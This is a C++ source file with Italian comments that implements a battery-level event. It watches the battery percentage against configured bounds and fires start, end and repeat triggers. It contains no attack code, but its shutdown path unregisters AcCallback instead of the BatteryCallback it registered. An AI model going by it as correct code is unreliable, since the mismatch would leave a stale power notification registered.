#include "Event.h"
#include "Common.h"
#include "Conf.h"
#include "Date.h"
#include "Log.h"
#include <pm.h>
#include "CallBacks.h"
#include "Device.h"

DWORD WINAPI OnBatteryLevel(LPVOID lpParam) {
	Event *me = (Event *)lpParam;
	Configuration *conf;
	HANDLE eventHandle;
	int delay, iterations, curIterations = 0, curDelay = 0, minLevel, maxLevel;
	const SYSTEM_POWER_STATUS_EX2 *pBattery = NULL;
	DWORD dwBatteryLife, dwPrevLife;
	BOOL bRange = FALSE;
	Device *deviceObj = Device::self();

	eventHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	try {
		iterations = conf->getInt(L"iter");
	} catch (...) {
		iterations = MAXINT;
	}

	try {
		delay = conf->getInt(L"delay") * 1000;
	} catch (...) {
		delay = INFINITE;
	}

	try {
		minLevel = conf->getInt(L"min");
	} catch (...) {
		minLevel = 0;
	}

	try {
		maxLevel = conf->getInt(L"max");
	} catch (...) {
		maxLevel = 100;
	}

	if (minLevel > maxLevel) {
		me->setStatus(EVENT_STOPPED);
		return 0;
	}

	deviceObj->RefreshBatteryStatus();
	pBattery = deviceObj->GetBatteryStatus();
	dwPrevLife = pBattery->BatteryLifePercent;

	// Se lo stato e' sconosciuto, assumiamo che sia carica
	if (dwPrevLife == BATTERY_PERCENTAGE_UNKNOWN)
		dwPrevLife = 100;

	if (deviceObj->RegisterPowerNotification(BatteryCallback, (DWORD)&dwBatteryLife) == FALSE) {
		me->setStatus(EVENT_STOPPED);
		return TRUE;
	}

	DBG_TRACE(L"Debug - Battery.cpp - Battery event started\n", 5, FALSE);

	LOOP {
		if (dwPrevLife != dwBatteryLife && dwBatteryLife != BATTERY_PERCENTAGE_UNKNOWN) {
			dwPrevLife = dwBatteryLife;

			// Nel range
			if ((dwBatteryLife >= (UINT)minLevel && dwBatteryLife <= (UINT)maxLevel) && bRange == FALSE) {
				bRange = TRUE;
				DBG_TRACE(L"Debug - Events.cpp - Battery event [IN action triggered]\n", 5, FALSE);
				me->triggerStart();
			} 

			// Fuori dal range
			if ((dwBatteryLife < (UINT)minLevel || dwBatteryLife > (UINT)maxLevel) && bRange == TRUE) {
				bRange = FALSE;
				DBG_TRACE(L"Debug - Events.cpp - Battery event [OUT action triggered]\n", 5, FALSE);
				me->triggerEnd();
			}
		}

		if (bRange)
			curDelay = delay;
		else
			curDelay = 60000;

		WaitForSingleObject(eventHandle, curDelay);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Events.cpp - Battery Event is Closing\n", 1, FALSE);
			me->setStatus(EVENT_STOPPED);

			deviceObj->UnRegisterPowerNotification(AcCallback);
			return 0;
		}

		if (bRange && curIterations < iterations) {
			me->triggerRepeat();
			curIterations++;
		}
	}

	me->setStatus(EVENT_STOPPED);
	return 0;
}